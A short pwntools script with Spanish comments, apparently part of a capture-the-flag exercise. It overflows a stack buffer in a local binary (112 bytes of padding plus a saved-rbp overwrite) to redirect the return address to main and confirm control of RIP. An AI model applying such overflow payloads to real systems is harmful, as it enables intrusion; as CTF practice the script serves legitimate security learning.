#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Probar control de RIP localmente
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

# Payload simple para verificar control de RIP
# Intentar saltar a la dirección de main para ver si tenemos control
main_addr = 0x400cfb  # dirección de main

payload = b'A' * 112  # buffer
payload += b'B' * 8   # rbp
payload += p64(main_addr)  # ret address

io.sendline(payload)

# Ver qué pasa
try:
    output = io.recvall(timeout=2)
    print("Output:", output)
    
    # Si salta a main, deberíamos ver el mensaje de bienvenida de nuevo
    if b'Welcome to my guessing game' in output:
        print("\n✓ Tenemos control de RIP! El programa saltó a main")
    else:
        print("\n✗ No se observó el comportamiento esperado")
except Exception as e:
    print(f"Error: {e}")

io.close()
